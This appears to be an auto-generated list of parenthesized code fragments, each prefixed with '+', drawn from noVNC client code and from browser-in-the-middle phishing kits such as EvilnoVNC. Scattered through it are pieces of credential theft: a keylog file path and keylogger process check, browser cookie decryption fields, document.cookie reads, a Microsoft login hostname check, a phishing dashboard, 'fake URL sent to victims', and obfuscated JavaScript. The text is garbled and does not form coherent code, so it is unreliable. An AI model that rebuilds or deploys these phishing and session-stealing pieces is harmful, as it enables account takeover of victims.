+"(this._sock.rQwait(""vencrypt ack"", 1"
+"(this._sock.rQwait(""vencrypt subtypes length"", 1"
+"(this._sock.rQwait(""vencrypt subtypes"", 4 * this._rfbVeNCryptSubtypesLength"
+"(this._sock.rQwait(""vencrypt version"", 2"
+"(this._sock.rQwait(""version"", 12"
+"(this._sock.rQwait('TightVNC extended server init header', 8, 24 + nameLength"
+"(this._sock.rQwait('TightVNC extended server init header', totalMessagesLength, 32 + nameLength"
+"(this._sock.rQwait('VNC auth response ', 4"
+"(this._sock.rQwait('server init name', nameLength, 24"
+"(this._url, this._wsProtocols"
+"(this.classList.contains(""noVNC_open"""
+"(this.parentNode, \"""" . $svrno . ""\"", \"""" . $reqid . ""\"""
+"(to right, #141414, #141414 1.5px, #000000 1.5px, #000000"
+"(txn, allowed_methods, allowed_headers"
+"(txn, allowed_methods, allowed_origins, allowed_headers"
+"(txn, origin, allowed_methods, allowed_origins, allowed_headers"
+"(type, encoderOptions"
+"(typeof urlOrChannel === ""string"""
+"(user-agent contains ""bot"" case insensitive"
+"(ver, op"
+"(width, height"
+"(window.location.hostname == ""login.live.com"""
+"(window.location.protocol === ""https:"""
+"(window.location.protocol.substring(0, 4"
+"(window.location.protocol.substring(0, 5"
+"(x, y"
+"(x, y, bmask"
+"(x, y, down, bmask"
+"(x, y, mask"
+"(x, y, this._mouseButtonMask"
+"({ name: ""AES-ECB"" }, cipher, credentials"
+"({ name: ""DES-CBC"", iv: secret }, key, passwordBytes"
+"({ name: ""DES-CBC"", iv: secret }, key, usernameBytes"
+"({ name: ""DES-ECB"" }, key, challenge"
+"({ name: ""DH"", g: g, p: p }, true, [""deriveBits""]"
+"({ name: ""DH"", public: A }, dhKey.privateKey, 64"
+"({ username: username, password: password }"
+"({}, function (cookies"
+( (text.length >> 24
+( function(
+(!!(actions & extendedClipboardActionCaps
+(!$state
+(!(code in this._keyDownList
+(!(flags & (1<<31
+(!(formats & extendedClipboardFormatText
+(!(major == 0 && minor == 2
+(!Number.isInteger(compressionLevel
+(!Number.isInteger(qualityLevel
+(!UI.connected
+(!UI.controlbarDrag
+(!UI.controlbarGrabbed
+(!UI.lastKeyboardinput
+(!UI.rfb
+(!UI.rfb.clipViewport && UI.rfb.dragViewport
+(!control
+(!decoder
+(!e.detail.clean
+(!empty($connected
+(!empty($data
+(!empty($lines
+(!empty($log
+(!empty($reqid
+(!file_exists($path
+(!hasScrollbarGutter
+(!host
+(!inputVal
+(!isSafari(
+(!isTouchDevice
+(!is_array($orig
+(!isset($reqid
+(!keysym
+(!port
+(!response.ok
+(!scale && this._clipViewport
+(!target
+(!this._enabledContinuousUpdates
+(!this._handleRect(
+(!this._initMsg(
+(!this._normalMsg(
+(!this._rfbRSAAESAuthenticationState.hasStarted
+(!this._rfbTightVNC
+(!this._scaleViewport
+(!this._showDotCursor
+(!this._target
+(!this._target.contains(target
+(!this._viewOnly
+(!this.focusOnClick
+(!trim($state2
+(!trim($state3
+(!urlOrChannel
+(!useFallback
+(!window.isSecureContext
+($_GET[$var]
+($_POST[$var]
+($_SERVER[$var]
+($_SERVER['HTTP_X_FORWARDED_FOR']
+($_SERVER['REQUEST_METHOD'] === 'POST'
+($array
+($auth_cnt > 0
+($auth_p %
+($click_cnt > 0
+($click_p %
+($command
+($config
+($content = file_get_contents($path
+($count > 0
+($data
+($data as $dat
+($file
+($i = 0; $i < $length; ++$i
+($id
+($idle_cnt > 0
+($idle_p %
+($length < 1
+($line
+($line !== false
+($lines
+($lines as $line
+($list as $elem
+($orig as $o
+($reqid
+($request_method = OPTIONS 
+($sep
+($separator
+($showhint
+($sid
+($state
+($state as $s
+($state as &$s
+($sum > 0
+($svrno
+($targets as $t
+($usera
+($var
+('
+(' '
+('!'
+(''
+('('
+('-'
+('.'
+('.*[?&]' + name + '=([^&#]*
+('./package.json'
+('/home/user/Downloads/keylog.txt'
+('2d'
+(':'
+(';'
+('='
+('@'
+('Authenticating using scheme: ' + this._rfbAuthScheme
+('Authentication OK'
+('BACKSPACE'
+('CapsLock'
+('Control'
+('DELETE'
+('Europe/Berlin'
+('LABEL'
+('NumLock'
+('Sent ProtocolVersion: ' + cversion
+('ShiftLeft' in this._keyDownList
+('ShiftRight' in this._keyDownList
+('\n'
+('app/locale/' + l10n.language + '.json'
+('canvas'
+('close'
+('compression'
+('connected'
+('connecting'
+('disconnected'
+('disconnecting'
+('div'
+('encrypt'
+('error'
+('host'
+('html'
+('init'
+('logging'
+('message'
+('noVNC_bell'
+('noVNC_clipboard'
+('noVNC_clipboard_button'
+('noVNC_clipboard_text'
+('noVNC_connect_dlg'
+('noVNC_control_bar'
+('noVNC_control_bar_anchor'
+('noVNC_control_bar_hint'
+('noVNC_credentials_dlg'
+('noVNC_disabled'
+('noVNC_fingerprint'
+('noVNC_fullscreen_button'
+('noVNC_hidden'
+('noVNC_keyboard_button'
+('noVNC_keyboardinput'
+('noVNC_modifiers'
+('noVNC_open'
+('noVNC_password_input'
+('noVNC_power'
+('noVNC_power_button'
+('noVNC_setting_' + name
+('noVNC_settings'
+('noVNC_settings_button'
+('noVNC_status'
+('noVNC_toggle_alt_button'
+('noVNC_toggle_ctrl_button'
+('noVNC_toggle_extra_keys_button'
+('noVNC_toggle_windows_button'
+('noVNC_username_input'
+('noVNC_verify_server_dlg'
+('noVNC_view_drag_button'
+('open'
+('password'
+('path'
+('php://input'
+('port'
+('quality'
+('reason' in e.detail
+('reconnect'
+('reconnect_delay'
+('reconnecting'
+('repeaterID'
+('resize'
+('shared'
+('show_dot'
+('utf8'
+('view_clip'
+('view_only'
+('{}'.format(event.Key
+('{}'.format(msg
+((
+(( $(ps -ef | grep -v grep | grep docker | wc -l
+(($json = file_get_contents($statefile
+((1 << bits
+((Date.now(
+((andMask[pixel] & PIXEL_MASK
+((browser.isMac(
+((code === 'ShiftLeft'
+((e
+((e.timeStamp - this._altGrCtrlTime
+((err
+((ev.detail.magnitudeX - this._gestureLastMagnitudeX
+((ev.detail.magnitudeY - this._gestureLastMagnitudeY
+((ev.type === 'click'
+((formats & index
+((i=1; i<=$instances; i++
+((int
+((magnitude -  this._gestureLastMagnitudeX
+((magnitude - this._gestureLastMagnitudeX
+((packageInfo
+((resolve
+((response
+((textData.length > 0
+((this._gestureLastTapTime !== null
+((this._rfbConnectionState === 'connecting'
+((this._rfbVersion * 10
+((time(
+((translations
+((w === 0
+((xorMask[pixel] & PIXEL_MASK
+()
+() => UI.saveSetting(name
+() can in theory call _fail(
+().then((
+().then(resolve
+();while(!![]
+(){var _0x2bb1d3=_0x27babc;if(_0x47670a[_0x2bb1d3(0x99
+()}
+(*
+(-data.length
+(-ms-high-contrast:active
+(-ms-high-contrast:none
+(-parseInt(_0xefc6e2(0x9e
+(.+\.php
+(/.+
+(0
+(0x88
+(0x8a
+(0x8b
+(0x8c
+(0x90
+(0x92
+(0x9c
+(0x9f
+(0xa1
+(1
+(1 << formatKeys[i]
+(100 %
+(100/$sum*$auth_cnt
+(100/$sum*$idle_cnt
+(100/$sum*($click_cnt + $subm_cnt
+(1000*60*5
+(12
+(12500
+(150
+(16
+(16 * numClientMessages
+(16 * numEncodings
+(16 * numServerMessages
+(16px
+(1<<0
+(1<<1
+(1<<2
+(1<<31
+(2
+(248
+(250
+(251
+(255
+(256
+(3
+(30
+(360deg
+(4
+(4 + (4 * formatKeys.length
+(4 + deflatedData.length
+(5
+(5000
+(6
+(64
+(8
+(<50ms
+(<?= $auth_cnt ?>
+(<?= $click_cnt ?>
+(<?= $count ?>
+(<?= $filename ?>
+(<?= $idle_cnt ?>
+(<?= $refreshtimer ?> s
+(<?= $reqid ?>
+(<?= $subm_cnt ?>
+(<URL>/phishboard
+(<custom-URL>
+(>=300 MB of RAM per active session
+(ALL
+(Array.from(document.getElementsByClassName('noVNC_version_separator'
+(Array.from(new Uint8Array(buffer
+(Array.from(new Uint8Array(byteArray
+(B
+(BETA
+(C
+(CN: testing-server
+(CORS
+(E_ALL
+(Element.ALLOW_KEYBOARD_INPUT
+(EvilnoVNC/Files/content.js
+(EvilnoVNC/Files/index.php
+(EvilnoVNC/Files/vnc_light.html
+(LINGUAS
+(Math.abs(magnitude - this._gestureLastMagnitudeX
+(Math.abs(this._accumulatedWheelDeltaX
+(Math.abs(this._accumulatedWheelDeltaY
+(Object.assign(document.createElement('h1'
+(RFBkeycode
+(UI.closeControlbarTimeout
+(UI.connected
+(UI.controlbarGrabbed && !UI.controlbarDrag
+(UI.defaultKeyboardinputLen
+(UI.getSetting('compression'
+(UI.getSetting('encrypt'
+(UI.getSetting('logging'
+(UI.getSetting('quality'
+(UI.getSetting('reconnect_delay'
+(UI.idleControlbarTimeout
+(UI.inhibitReconnect
+(UI.prime
+(UI.reconnectCallback
+(UI.reconnectCallback !== null
+(UI.rfb
+(UI.rfb.clipViewport
+(UI.rfb.dragViewport
+(UI.rfb.viewOnly
+(UI.statusTimeout
+(UTC
+(User-Agent
+(WebUtil.readSetting('controlbar_pos'
+(_
+(_0x20c3e4===_0x2a5c94
+(_0x27babc(0x93
+(_0x27babc(0x96
+(_0x524958
+(_0x52906f(0x9d
+(_0x71d5d2['shift'](
+(_0xefc6e2(0x8d
+(_0xefc6e2(0x94
+(_0xefc6e2(0x95
+(_0xefc6e2(0x98
+(_0xefc6e2(0x9a
+(_0xefc6e2(0x9b
+(_0xefc6e2(0xa0
+(_haad
+(`./setup.sh`
+(`attaching ${this._rawChannel} to Websock`
+(`connecting to ${this._url}`
+(a
+(accesstoken
+(actions & index
+(actions === extendedClipboardActionNotify
+(actions === extendedClipboardActionPeek
+(actions === extendedClipboardActionProvide
+(actions === extendedClipboardActionRequest
+(allowed_origin
+(allowed_origins
+(already authenticated
+(andMask[pixel] == 0
+(assuming admin access
+(at your option
+(authType
+(authenticated
+(autoconnect === 'true' || autoconnect == '1'
+(b
+(bar
+(barDisplayStyle !== 'none'
+(bits * 0
+(bits * 1
+(bits * 2
+(blacklist!
+(both dangling and unused
+(bpp
+(browser.isMac(
+(browser.isWindows(
+(btn
+(buffer
+(button
+(c
+(c => c.charCodeAt(0
+(capabilities
+(changeFunc === undefined
+(children[j].form !== undefined
+(chromedate
+(clean(decrypted
+(clientSupportedTypes[authType]
+(code !== 'Unidentified'
+(code === 'CapsLock'
+(code === 'ShiftRight'
+(code === 'Unidentified'
+(code > 0xff
+(code in this._keyDownList
+(codepoint
+(compressionLevel
+(controlbarBounds.height - handleHeight
+(controlbarBounds.height < (handleHeight + margin * 2
+(creation_utc
+(creds
+(cssValue
+(ctrl.options[i].value === value
+(ctrl.type === 'checkbox'
+(curClip !== newClip
+(cursorType == 0
+(cursorType == 1
+(d.getTime(
+(data
+(debug
+(decrypted
+(deltaY
+(depth
+(depth > 16
+(depth > 8
+(depth/3
+(details
+(directxman12
+(distance < DOUBLE_TAP_THRESHOLD
+(docker ps -a -q
+(docker volume
+(document.activeElement
+(document.activeElement != input
+(document.activeElement == input
+(document.body.msRequestFullscreen
+(document.captureElement
+(document.cookie
+(document.documentElement
+(document.documentElement.mozRequestFullScreen
+(document.documentElement.requestFullscreen
+(document.documentElement.webkitRequestFullscreen
+(document.exitFullscreen
+(document.getElementById('noVNC_clipboard'
+(document.getElementById('noVNC_container'
+(document.getElementById('noVNC_control_bar'
+(document.getElementById('noVNC_keyboard_button'
+(document.getElementById('noVNC_keyboardinput'
+(document.getElementById('noVNC_modifiers'
+(document.getElementById('noVNC_power'
+(document.getElementById('noVNC_setting_logging'
+(document.getElementById('noVNC_settings'
+(document.getElementById('screen'
+(document.getElementsByClassName('noVNC_version'
+(document.getElementsByClassName('noVNC_version_wrapper'
+(document.mozCancelFullScreen
+(document.msExitFullscreen
+(document.webkitExitFullscreen
+(domain.localeCompare(targetDomain
+(down
+(down && !this._viewportDragging
+(down === undefined
+(dragDistance < dragThreshold
+(dynamic
+(e
+(e.button != 0
+(e.code
+(e.keyCode
+(e.keyCode !== 229
+(e.keyCode == 17
+(e.keyIdentifier
+(e.keyIdentifier.substr(2
+(e.message
+(e.metaKey && code !== 'MetaLeft' && code !== 'MetaRight'
+(e.name === 'NotFoundError'
+(e.reason
+(el => el.innerText = packageInfo.version
+(el => el.style.display = 'none'
+(elem
+(empty($targets
+(enable
+(encodings.encodingCopyRect
+(encodings.encodingHextile
+(encodings.encodingJPEG
+(encodings.encodingRRE
+(encodings.encodingRaw
+(encodings.encodingTight
+(encodings.encodingTightPNG
+(encodings.encodingZRLE
+(encodings.length
+(encodings.pseudoEncodingCompressLevel0 + this._compressionLevel
+(encodings.pseudoEncodingContinuousUpdates
+(encodings.pseudoEncodingCursor
+(encodings.pseudoEncodingDesktopName
+(encodings.pseudoEncodingDesktopSize
+(encodings.pseudoEncodingExtendedClipboard
+(encodings.pseudoEncodingExtendedDesktopSize
+(encodings.pseudoEncodingFence
+(encodings.pseudoEncodingLastRect
+(encodings.pseudoEncodingQEMUExtendedKeyEvent
+(encodings.pseudoEncodingQualityLevel0 + this._qualityLevel
+(encodings.pseudoEncodingVMwareCursor
+(encodings.pseudoEncodingXvp
+(encodings[i]
+(encrypted_value
+(env
+(err
+(ev
+(ev.deltaMode !== 0
+(ev.detail.type
+(ev.target !== this._canvas
+(ev.type
+(ev.type === 'click'
+(ev.type === 'contextmenu'
+(even if they are happy
+(event
+(event.relatedTarget
+(event.target
+(event.target.focus.bind(event.target
+(event.target.form !== undefined
+(event.target.type
+(eventY
+(ex
+(exc
+(expires_utc
+(extended
+(fake URL sent to victims
+(false
+(feedback is welcome
+(file_get_contents($path
+(file_get_contents($statefile
+(filename
+(first
+(firstUpdate
+(flags
+(for any work
+(format === extendedClipboardFormatText
+(formats
+(formats & extendedClipboardFormatText
+(formats & format
+(formats[i] != extendedClipboardFormatText
+(function (
+(function(
+(function(item
+(gratis or for a charge
+(grep
+(h
+(h === 0
+(handle
+(handleBounds.top
+(handleHeight === 0 || controlbarBounds.height === 0
+(haproxy limitation
+(haproxy/503.http
+(haproxy/haproxy.cfg and controller/src/*/*.php
+(head -1 ./tmp/reqid$SID.txt
+(head -1 ./tmp/resolution$SID.txt
+(head -1 ./tmp/useragent$SID.txt
+(head -1 /home/user/tmp/reqid$SID.txt
+(head -1 /home/user/tmp/resolution$SID.txt
+(head -1 /home/user/tmp/useragent$SID.txt
+(head -1 title.txt
+(height
+(htmlFor
+(htmlFor != ''
+(httpOnly
+(https://darkbyte.net
+(https://github.com/JoelGMSec/EvilnoVNC
+(https://github.com/fkasler/cuddlephish
+(https://github.com/powerseb/NoPhish
+(https://github.com/wanetty/MultiEvilnoVNC
+(https://twitter.com/JoelGMSec
+(https://twitter.com/mrd0x
+(https://www.buymeacoffee.com/joelgmsec
+(i
+(i === 0
+(id
+(if any
+(if you work as a programmer
+(img/dashboard.png
+(img/logo.png
+(img/targets.png
+(including a cross-claim or counterclaim in a lawsuit
+(including a physical distribution medium
+(incremental ? 1 : 0
+(inputFocus
+(inputVal
+(int
+(isCaps
+(isRepeater
+(isTouchDevice
+(is_array($state
+(isset($entry[$cnt]
+(isset($usera
+(item
+(items
+(k1
+(k2
+(key up
+(keyLength
+(keycode
+(keycode & 0x00ff
+(keycode >> 8
+(keysym
+(keysyms.lookup(newValue.charCodeAt(i
+(last_access_utc
+(length
+(length - 4
+(length > 64
+(length >= 0
+(let authType in clientSupportedTypes
+(let code in this._keyDownList
+(let codePoint of text
+(let form of forms
+(let i = 0; i < actions.length; i++
+(let i = 0; i < backspaces; i++
+(let i = 0; i < ctrl.options.length; i += 1
+(let i = 0; i < encodings.length; i++
+(let i = 0; i < formatKeys.length; i++
+(let i = 0; i < formats.length; i++
+(let i = 0; i < labels.length; i++
+(let i = 0; i < llevels.length; i += 1
+(let i = 0; i < numTunnels; i++
+(let i = 0; i < numberOfScreens; i += 1
+(let i = 0; i < password.length; i++
+(let i = 0; i < subAuthCount; i++
+(let i = 0; i < textData.length; i++
+(let i = 0; i < this._rfbVeNCryptSubtypesLength; i++
+(let i = 0; i < username.length; i++
+(let i = 0; i <= 15; i++
+(let i = 0;i < exps.length;i++
+(let i = 24; i <= 31; i++
+(let i = 3; i < this._cursorImage.rgbaPixels.length; i += 4
+(let i = newLen - inputs; i < newLen; i++
+(let input of inputs
+(let j = 0; j < children.length; j++
+(let j = 0; j < text.length; j++
+(let pixel = 0; pixel < (w * h
+(let type of subtypes
+(let type of types
+(let x = 0; x < w; x++
+(let y = 0; y < h; y++
+(like Alt+1 or Ctrl+S
+(like password
+(list of mail addresses one per line
+(live
+(log_file
+(mask
+(mask[maskIdx] << (x % 8
+(masklength
+(match
+(match[1]
+(max-width: 1600px
+(max-width:720px
+(microseconds=chromedate
+(ms
+(msg
+(msgType
+(mycreds
+(name
+(nameLength
+(new Uint8Array(128
+(new Uint8Array(dataToDeflate
+(new Uint8Array(fingerprint
+(new Uint8ClampedArray(rgba
+(newClip
+(newLen < 1
+(newLen > 2 * UI.defaultKeyboardinputLen
+(newValue.charAt(i
+(newY < controlbarBounds.top + margin
+(novnc/sXX
+(null
+(numServerMessages + numClientMessages + numEncodings
+(numTunnels
+(numTunnels > 0
+(numTypes
+(numTypes === 0
+(numberOfScreens * 16
+(oldstate !== ''
+(oldstate !== 'connected' && oldstate !== 'connecting'
+(oldstate !== 'connecting'
+(oldstate !== 'disconnecting'
+(oldstate === 'disconnected'
+(on
+(on === this._clippingViewport
+(op
+(operated by you or a third party
+(options
+(options.showDotCursor !== undefined
+(optn
+(or 443
+(or copies made from those copies
+(panel
+(parseInt(_0xefc6e2(0x8e
+(parseInt(_0xefc6e2(0x91
+(parseInt(_0xefc6e2(0x97
+(pass
+(pass.length
+(password === null
+(passwordBytes
+(pattern
+(payload
+(payload.length
+(persistent
+(phisboard and direct access to sessions
+(pixel * 4
+(pixel * bytesPerPixel
+(pixelslength
+(port
+(prefers-color-scheme:dark
+(prefersDarkMode
+(promise
+(ps aux | grep keylog | grep -v grep | grep -v while >/dev/null
+(ptr.clientX < (window.innerWidth * 0.1
+(ptr.clientX > (window.innerWidth * 0.9
+(ptr.clientY - UI.controlbarMouseDownClientY
+(qualityLevel
+(quicker start in kiosk.sh
+(re
+(realpath ..
+(regardless of how the transaction is characterized
+(reject
+(repeaterID
+(repeaterID.length < 250
+(reply
+(reqid
+(reqid+sid
+(request.status >= 200 && request.status < 300
+(res != 0
+(resize
+(response
+(ret && !this._enabledContinuousUpdates
+(s
+(scale
+(scale && this._clipViewport
+(scaling
+(see LICENSE.txt
+(see above
+(see handler for why we bind to document
+(seq $instances -1 1
+(serverSupportedTunnelTypes[0]
+(serverSupportedTypes.indexOf(authType
+(session
+(show
+(show Chromium GUI + DevTools
+(size
+(size.h
+(size.w
+(sizeArray[0] << 24
+(sizeArray[1] << 16
+(sizeArray[2] << 8
+(sizeArray[3]
+(source.includes(val
+(source.indexOf(searchString
+(state
+(state === oldstate
+(status === 0
+(statusType
+(statusType !== 'error'
+(str
+(strlen
+(strlen > 0
+(strtr(base64_encode($data
+(subAuthCount === 0
+(submit log
+(subtypesLength < 1
+(sversion
+(svr
+(target
+(target === this._target
+(targetURL
+(tbd
+(text
+(text.charCodeAt(j
+(text.length & 0xFF
+(text.length >>  8
+(text.length >> 16
+(textData
+(textData !== null
+(textData.length - 1
+(textData[i]
+(this
+(this._FBU.encoding
+(this._FBU.encoding === null
+(this._FBU.rects === 0
+(this._FBU.rects > 0
+(this._FBU.x === 1 && this._FBU.y !== 0
+(this._FBU.y
+(this._accumulatedWheelDeltaX < 0
+(this._accumulatedWheelDeltaX > 0
+(this._accumulatedWheelDeltaY < 0
+(this._accumulatedWheelDeltaY > 0
+(this._altGrArmed
+(this._altGrTimeout
+(this._canvas
+(this._canvas.style.visibility !== 'hidden'
+(this._canvas.style.visibility === 'hidden'
+(this._captureIsActive(
+(this._clientHasExpectedSize(
+(this._clipboardServerCapabilitiesActions[extendedClipboardActionNotify]
+(this._clipboardServerCapabilitiesActions[extendedClipboardActionRequest]
+(this._clipboardText != null
+(this._compressionLevel === compressionLevel
+(this._cursorImage.rgbaPixels[i]
+(this._disconnTimer
+(this._disconnTimer && state !== 'disconnecting'
+(this._display.pending(
+(this._eventHandlers.handleResize
+(this._fbDepth == 24
+(this._flushing
+(this._gestureFirstDoubleTapEv.detail.type === ev.detail.type
+(this._handleAltGrTimeout.bind(this
+(this._initMsg.bind(this
+(this._isSupportedSecurityType(type
+(this._mouseMoveTimer
+(this._mouseMoveTimer !== null
+(this._mouseMoveTimer == null
+(this._qemuExtKeyEventSupported && scancode
+(this._qualityLevel === qualityLevel
+(this._rawChannel
+(this._requestRemoteResize.bind(this
+(this._resizeSession
+(this._resizeTimeout
+(this._rfbAuthScheme
+(this._rfbAuthScheme == 0
+(this._rfbAuthScheme === -1
+(this._rfbConnectionState
+(this._rfbConnectionState !== 'connected'
+(this._rfbConnectionState !== 'connected' || this._viewOnly
+(this._rfbConnectionState === 'connected'
+(this._rfbConnectionState === 'connecting'
+(this._rfbCredentials.ardCredentials
+(this._rfbCredentials.ardPublicKey
+(this._rfbCredentials.password
+(this._rfbCredentials.password === undefined
+(this._rfbCredentials.password.length
+(this._rfbCredentials.target
+(this._rfbCredentials.target.length
+(this._rfbCredentials.username
+(this._rfbCredentials.username.length
+(this._rfbInitState
+(this._rfbInitState === ''
+(this._rfbRSAAESAuthenticationState !== null
+(this._rfbRSAAESAuthenticationState === null
+(this._rfbTightVNC
+(this._rfbVeNCryptState == 0
+(this._rfbVeNCryptState == 1
+(this._rfbVeNCryptState == 2
+(this._rfbVeNCryptState == 3
+(this._rfbVersion > this._rfbMaxVersion
+(this._rfbVersion >= 3.7
+(this._rfbVersion >= 3.8
+(this._rfbXvpVer < ver
+(this._scaleViewport
+(this._screen
+(this._shared ? 1 : 0
+(this._shouldShowCursor(target
+(this._sock.rQshift32(
+(this._sock.rQshiftBytes(16
+(this._sock.readyState === 'closed'
+(this._sock.readyState === 'open'
+(this._target
+(this._url
+(this._viewOnly
+(this._viewportDragging
+(this._viewportHasMoved
+(this._viewportHasMoved || (Math.abs(deltaX
+(this.dragViewport
+(time
+(timeSinceLastMove > MOUSE_MOVE_DELAY
+(transaction_data
+(true
+(trueColor ? 1 : 0
+(txn
+(type
+(type === 'RSA'
+(type === securityTypeVeNCrypt
+(typeof UI.rfb !== 'undefined'
+(typeof ctrl.options !== 'undefined'
+(typeof password === 'undefined'
+(typeof statusType === 'undefined'
+(typeof time === 'undefined'
+(typeof val !== 'undefined' && val !== null && ctrl.type === 'checkbox'
+(typeof(x
+(typeof(y
+(up
+(upperByte === 0xe0 && lowerByte < 0x7f
+(url
+(useFallback
+(user
+(user id is the mail address
+(user.length
+(usernameBytes
+(val
+(val === null
+(val.toString(
+(ver
+(viewOnly
+(viewport
+(viewportRelativeY
+(w
+(w * h
+(w * h * 4
+(w * h * bytesPerPixel
+(w / 8
+(wasConnected
+(width
+(window.getComputedStyle(target
+(window.visualViewport
+(with or without modification
+(x
+(x / 8
+(x => parseInt(x
+(xdpyinfo -display $DISPLAY 2> /dev/null
+(xorMask[pixel] == 0
+(xtScanCode
+(xvpMsg
+(y
+(zlibStream
+({ password: password }
+({ preventScroll: true }
